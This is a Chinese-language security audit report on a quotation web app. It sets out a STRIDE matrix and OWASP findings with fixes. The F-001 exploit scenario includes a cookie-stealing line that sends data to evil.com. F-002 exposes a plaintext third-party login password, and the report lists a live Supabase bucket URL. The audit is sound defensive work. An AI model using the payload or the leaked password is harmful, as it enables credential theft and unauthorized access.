# Security Posture Report — 智能询价系统

## Meta
- Audit mode: Comprehensive
- Date: 2026-05-16T024900Z
- Scope: Full frontend application (apps/app.js, apps/lib/*, apps/index.html, apps/_headers, netlify.toml, Supabase public bucket)
- Total phases executed: 14/14

## Executive Summary

智能询价系统存在 **2 个高危、4 个中危、4 个低危** 安全问题。最严重的威胁是：(1) Supabase 公开存储桶被投毒后通过动态脚本注入实现远程代码执行（RCE），(2) 三菱 MMC 系统密码硬编码在前端源码中导致凭证泄露。建议上线前必须修复 F-001（脚本注入改为 JSON 解析）和 F-002（移除硬编码密码），并配置 CSP 安全头。

## STRIDE 威胁矩阵

| STRIDE 类别 | 威胁场景 | 影响 | 现有缓解 | 风险等级 |
|---|---|---|---|---|
| **Spoofing（欺骗）** | 攻击者通过 Supabase 投毒的 price.bundle.js 替换 `window.PRICE_BUNDLE`，注入恶意代码伪装正常数据 | 用户执行恶意代码，数据被窃取 | 无 | 🔴 高 |
| **Tampering（篡改）** | 攻击者替换 Supabase 公开存储桶中的 price.bundle.js / stock.bundle.js / config.json | 所有用户加载篡改后的价格/库存/配置数据；若 bundle.js 被篡改则同时实现 RCE | 版本号缓存机制（version.json），但无签名校验 | 🔴 高 |
| **Repudiation（抵赖）** | 无审计日志，Supabase 存储桶的写操作无记录 | 无法追踪谁篡改了数据 | 无 | 🟠 中 |
| **Information Disclosure（信息泄露）** | ① MMC 密码硬编码在前端 JS 中，任何用户可查看；② 完整价格/库存数据通过公开 URL 可被任意爬取；③ Supabase 项目 ID 暴露 | 竞争对手获取价格体系；未授权访问三菱 MMC 系统 | 价格包有 AES-GCM 加密选项（但当前 secured=false） | 🔴 高 |
| **Denial of Service（拒绝服务）** | 无请求频率限制，搜索操作为全量内存扫描，大量并发查询可能耗尽浏览器资源 | 用户浏览器卡死 | 无 | 🟡 低 |
| **Elevation of Privilege（提权）** | 动态脚本注入（script.text = text + appendChild）使远程 JS 在页面上下文中执行，等同于页面自身权限 | 攻击者可访问 localStorage、Clipboard API、发起同源请求 | 无 | 🔴 高 |

## OWASP Top 10 对应问题列表

### [F-001] 远程脚本注入 — 动态执行 Supabase 下载的 JS
- **Category**: OWASP A03 Injection / A08 Software & Data Integrity Failures
- **Severity**: 🔴 高危（Critical）
- **Confidence**: 10/10 — 已通过 curl 直接下载验证 price.bundle.js 是可执行 JS 且无签名
- **Location**: `apps/app.js:382-386`
- **Description**: `fetchFileWithCache` 函数从 Supabase 公开存储桶下载 `price.bundle.js` 和 `stock.bundle.js`，然后直接以 `script.text = text; document.body.appendChild(script)` 形式注入页面执行。这意味着下载的 JavaScript 代码在页面同源上下文中运行，拥有对 DOM、localStorage、Clipboard API、fetch 等所有浏览器 API 的完全访问权限。
- **Exploit Scenario**:
  1. 攻击者获得 Supabase 存储桶写权限（通过泄露的 service_role key、内部人员、或 Supabase 平台漏洞）
  2. 替换 `price.bundle.js` 为恶意 JS：`window.PRICE_BUNDLE = {...}; fetch('https://evil.com/steal?c=' + document.cookie);`
  3. 所有用户下次加载数据时自动执行恶意代码
  4. 由于无 CSP 限制，恶意代码可向任意域发送请求
- **Reproduction Steps**:
  1. `curl -s "https://xnnolklpjentxhosetcd.supabase.co/storage/v1/object/public/quotation-data/price.bundle.js" | head -1` — 确认文件以 `window.PRICE_BUNDLE =` 开头，为可执行 JS
  2. 查看源码 `apps/app.js:382-386` 确认 `script.text = text; document.body.appendChild(script)` 无任何沙箱或校验
  3. Supabase 响应头 `access-control-allow-origin: *`，任何网站都可跨域加载此文件
- **Remediation**:
  - **方案 A（推荐）**：将数据格式从 JS 改为 JSON。`price.bundle.js` 改为 `price.json`，用 `JSON.parse(text)` 替代 `script.text = text; appendChild(script)`。这彻底消除代码注入向量。
  - **方案 B（降级）**：如必须保留 JS 格式，添加 SRI（Subresource Integrity）校验——在 `version.json` 中记录每个 bundle 文件的 SHA-384 hash，加载后比对。
  - 无论哪种方案，都应配合 CSP 的 `script-src` 限制（见 F-005）。
- **Priority**: P0（上线前必须修复）

### [F-002] 三菱 MMC 系统密码硬编码在前端源码
- **Category**: OWASP A07 Identification and Authentication Failures / STRIDE Information Disclosure
- **Severity**: 🔴 高危（Critical）
- **Confidence**: 10/10 — 代码中明文可见 `const MMC_PASSWORD = "%461971#"`
- **Location**: `apps/app.js:18`
- **Description**: 三菱材料官网 MMC 系统的登录密码 `%461971#` 硬编码在客户端 JavaScript 中。任何用户打开浏览器开发者工具即可看到此密码。`openMmcLogin()` 函数还会自动将密码复制到剪贴板。
- **Exploit Scenario**:
  1. 任何访问者打开 DevTools → Sources → app.js → 搜索 `MMC_PASSWORD`
  2. 获取密码 `%461971#`
  3. 使用该密码登录三菱 MMC 系统，可能访问更敏感的库存/订单信息
- **Reproduction Steps**:
  1. 打开 `apps/app.js` 第 18 行：`const MMC_PASSWORD = "%461971#";`
  2. 第 937 行 `openMmcLogin()` 将密码复制到剪贴板：`copyToClipboard(MMC_PASSWORD);`
- **Remediation**:
  - 移除硬编码密码。如果 MMC 登录是必要功能，让用户自行输入密码（使用浏览器密码管理器保存）。
  - 如果必须保留快捷登录功能，至少将密码移至服务端代理（但这在纯前端架构中不可行——说明此功能设计本身就有问题）。
  - 最小修复：删除 `MMC_PASSWORD` 常量和 `openMmcLogin` 中的 `copyToClipboard(MMC_PASSWORD)` 调用，改为 `prompt("请输入MMC密码")` 让用户手动输入。
- **Priority**: P0（上线前必须修复）

### [F-003] Supabase 公开存储桶无访问控制 — 数据可被任意爬取和投毒
- **Category**: OWASP A01 Broken Access Control / STRIDE Tampering + Information Disclosure
- **Severity**: 🟠 中危（High）
- **Confidence**: 9/10 — 已通过 curl 验证所有文件均可公开访问，`access-control-allow-origin: *`
- **Location**: Supabase bucket URL + `apps/app.js:293`
- **Description**: Supabase 存储桶配置为 public，所有文件（version.json, price.bundle.js, stock.bundle.js, config.json）均无需认证即可读取。CORS 设置为 `*`，任意域可跨域请求。完整的价格数据（23MB+，含所有规格面价）可被竞争对手批量下载。
- **Exploit Scenario**:
  1. 竞争对手用爬虫下载 price.bundle.js，解析获取所有产品的面价
  2. 通过 version.json 轮询监控价格更新时间，实时跟踪价格变动
  3. 如果存储桶写权限配置不当（如 service_role key 泄露），可直接篡改数据
- **Reproduction Steps**:
  1. `curl -s "https://xnnolklpjentxhosetcd.supabase.co/storage/v1/object/public/quotation-data/version.json"` → `{"version": "2026年5月11日"}`
  2. `curl -sI "https://xnnolklpjentxhosetcd.supabase.co/storage/v1/object/public/quotation-data/price.bundle.js"` → `HTTP/2 200`, `access-control-allow-origin: *`
  3. 下载 price.bundle.js 可直接读取所有 base64 编码的价格数据（当前 `secured: false`）
- **Remediation**:
  - 将存储桶从 public 改为需认证访问，前端通过 Supabase 匿名登录 + RLS 策略控制访问
  - 如果必须公开（纯前端无后端），至少将 price 数据设为 `secured: true`（加密模式），利用已有的 AES-GCM 解密流程
  - 在 Supabase 层面配置 CORS，限制 `access-control-allow-origin` 为你的 Netlify 域名
- **Priority**: P1

### [F-004] 缺少 CSP 及其他安全响应头
- **Category**: OWASP A05 Security Misconfiguration
- **Severity**: 🟠 中危（High）
- **Confidence**: 9/10 — 已验证 _headers 文件和 netlify.toml 均未配置安全头
- **Location**: `apps/_headers`, `netlify.toml`
- **Description**: Netlify 部署缺少以下关键安全响应头：
  - **Content-Security-Policy**：无。允许内联脚本、任意域脚本加载、任意域样式加载。这是 F-001（脚本注入）的必要条件——有了 CSP，即使 bundle 被投毒，恶意代码也无法向外部域发送数据。
  - **X-Frame-Options**：无。页面可被 iframe 嵌入，存在 Clickjacking 风险。
  - **X-Content-Type-Options**：无。浏览器可能对响应进行 MIME 嗅探。
  - **Referrer-Policy**：无。URL 中的查询参数可能通过 Referer 头泄露。
  - **Permissions-Policy**：无。未限制浏览器 API（如 clipboard-read 在无权限策略下仍可被注入脚本调用）。
- **Reproduction Steps**:
  1. 查看 `apps/_headers`：仅配置了 `Cache-Control`，无安全头
  2. 查看 `netlify.toml`：无 `[[headers]]` 段
- **Remediation** — 在 `netlify.toml` 中添加：
  ```toml
  [[headers]]
    for = "/*"
    [headers.values]
      Content-Security-Policy = "default-src 'self'; script-src 'self' https://xnnolklpjentxhosetcd.supabase.co; style-src 'self' 'unsafe-inline'; connect-src 'self' https://xnnolklpjentxhosetcd.supabase.co; img-src 'self'; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
      X-Frame-Options = "DENY"
      X-Content-Type-Options = "nosniff"
      Referrer-Policy = "strict-origin-when-cross-origin"
      Permissions-Policy = "clipboard-write=(self)"
  ```
  注意：CSP 的 `script-src` 需要包含 Supabase 域（如果保留 JS bundle 格式），但如果改为 JSON 格式（F-001 方案 A），则可以更严格：`script-src 'self'`。
- **Priority**: P1

### [F-005] prompt() 获取密码的安全性不足
- **Category**: OWASP A07 Identification and Authentication Failures
- **Severity**: 🟠 中危（Medium）
- **Confidence**: 7/10 — prompt() 的安全问题已充分了解
- **Location**: `apps/app.js:411-414`
- **Description**: 使用 `window.prompt()` 获取价格包解密密码。问题：① prompt() 返回值是字符串，无法做到内存中及时清除；② 浏览器可能会记住 prompt 输入（某些浏览器有自动填充）；③ prompt() 无法自定义 UI，不能做密码可见性切换、强度提示；④ 某些浏览器对 prompt() 的支持不一致，可能被弹窗拦截器阻止。
- **Remediation**:
  - 替换为自定义模态框（项目中已有 `defaultDiscountModal` 的模态框模式可以参考）
  - 使用 `<input type="password">` 获取密码
  - 密码使用后尽快从变量中清除：`pwd = null;`
- **Priority**: P2

### [F-006] localStorage 存储折扣配置无加密或完整性保护
- **Category**: OWASP A08 Software and Data Integrity Failures / STRIDE Tampering
- **Severity**: 🟠 中危（Medium）
- **Confidence**: 7/10 — localStorage 可被同源脚本修改
- **Location**: `apps/app.js:103-118`
- **Description**: 用户自定义折扣配置存储在 localStorage 中（key: `v9-default-discount-config`），以明文 JSON 格式存储，无完整性校验。如果 F-001（脚本注入）被利用，攻击者可以修改 localStorage 中的折扣配置，导致用户看到错误的报价。
- **Remediation**:
  - 对 localStorage 数据添加 HMAC 签名校验（使用硬编码在前端的密钥，防篡改但不防逆向）
  - 或者：加载时与远程 config.json 比对，检测异常值
  - 这是 F-001 的衍生风险，修复 F-001 后此风险大幅降低
- **Priority**: P2

### [F-007] Supabase 项目 ID 暴露
- **Category**: OWASP A01 Broken Access Control / STRIDE Information Disclosure
- **Severity**: 🟡 低危（Low）
- **Confidence**: 8/10 — 项目 ID 在源码和响应头中均可见
- **Location**: `apps/app.js:293`, Supabase 响应头 `sb-project-ref`
- **Description**: Supabase 项目 ID `xnnolklpjentxhosetcd` 暴露在源码中。此 ID 可用于探测 Supabase API 端点（如 `https://xnnolklpjentxhosetcd.supabase.co/rest/v1/`）、尝试未保护的表访问、或通过 Supabase Auth 尝试暴力登录。
- **Remediation**:
  - 如有 Supabase 后端 API，确保所有表都有 RLS 策略
  - 禁用未使用的 Supabase Auth 功能
  - 长期考虑使用 Netlify Proxy 转发 Supabase 请求，隐藏真实 URL
- **Priority**: P3

### [F-008] Cache API 缓存投毒
- **Category**: OWASP A08 Software and Data Integrity Failures / STRIDE Tampering
- **Severity**: 🟡 低危（Low）
- **Confidence**: 5/10 — 需要中间人攻击或恶意 Service Worker
- **Location**: `apps/app.js:360-396`
- **Description**: 使用 Cache API 缓存从 Supabase 下载的文件。缓存以 URL + 查询参数为 key，如果攻击者能注入恶意响应（如通过中间人攻击，尽管 Supabase 使用 HTTPS），缓存会被投毒且持续有效直到版本号更新。
- **Remediation**:
  - 添加响应内容的 SRI 校验后再写入缓存
  - 这是 F-001 的衍生风险，核心修复方案一致
- **Priority**: P3

### [F-009] innerHTML 使用中的 XSS 风险评估
- **Category**: OWASP A03 Injection (XSS)
- **Severity**: 🟡 低危（Low）
- **Confidence**: 8/10 — 已验证所有动态值均通过 escapeHtml() 处理
- **Location**: `apps/app.js:573-580`, `apps/app.js:749-764`
- **Description**: 代码中多处使用 `innerHTML` 拼接 HTML，但所有用户可控的动态值都经过 `escapeHtml()` 函数处理。`escapeHtml` 正确转义了 `&`, `<`, `>`, `"`, `'` 五个关键字符。**当前代码不存在 XSS 漏洞**，但 `innerHTML` 模式本身就是风险点——未来开发者如果忘记调用 `escapeHtml()` 就会引入 XSS。
- **Remediation**:
  - 长期建议：改用 DOM API（`createElement`, `textContent`）替代 innerHTML
  - 短期：添加 CSP 的 `script-src` 限制，即使出现 XSS 也无法执行内联脚本
- **Priority**: P3

### [F-010] onclick 内联事件处理器
- **Category**: OWASP A05 Security Misconfiguration
- **Severity**: 🟡 低危（Info）
- **Confidence**: 9/10 — 已在 index.html 中确认
- **Location**: `apps/index.html:26-29`, `apps/index.html:60-63` 等
- **Description**: HTML 中使用 `onclick="doSearch()"` 等内联事件处理器。这要求 CSP 中必须包含 `'unsafe-inline'` 或使用 nonce/hash，降低了 CSP 的保护效果。如果配置了严格的 CSP（不含 `'unsafe-inline'`），这些内联处理器将失效。
- **Remediation**:
  - 将事件绑定移至 JS 中（项目已部分使用 `addEventListener` 模式）
  - 这样 CSP 可以使用 `script-src 'self'` 而不需要 `'unsafe-inline'`
- **Priority**: P3

### F-001 修复方案A：fetchFileWithCache 改为 JSON 解析

```javascript
async function fetchFileWithCache(filename, version, fileType) {
  const cacheName = 'quotation-cache-v1';
  const fileUrl = `${SUPABASE_BASE_URL}/${filename}?v=${version}`;

  const cache = await caches.open(cacheName);
  let response = await cache.match(fileUrl);

  if (!response) {
    console.log(`[${filename}] 缓存未命中或版本更新，从 Supabase 下载...`);
    response = await fetch(fileUrl);
    if (response.ok) {
      await cache.put(fileUrl, response.clone());
      cleanOldCache(cache, filename, fileUrl);
    } else {
      throw new Error(`${filename} 下载失败`);
    }
  }

  const text = await response.text();
  if (fileType === 'json') {
    window.APP_CONFIG = JSON.parse(text);
  } else if (fileType === 'js') {
    // 安全替代：用 JSON.parse 替代 script 注入
    // 数据文件改为 .json 格式，不再包含可执行代码
    try {
      const data = JSON.parse(text);
      if (filename.includes('price')) {
        window.PRICE_BUNDLE = data;
      } else if (filename.includes('stock')) {
        window.STOCK_BUNDLE = data;
      }
    } catch (e) {
      throw new Error(`${filename} 解析失败：数据格式异常`);
    }
  }
}
```

注意：此方案需要同步修改数据生成脚本，将 `price.bundle.js` 改为 `price.json`（去掉 `window.PRICE_BUNDLE = ` 前缀），并在 `loadDataWithCache` 中将文件名从 `.bundle.js` 改为 `.json`。
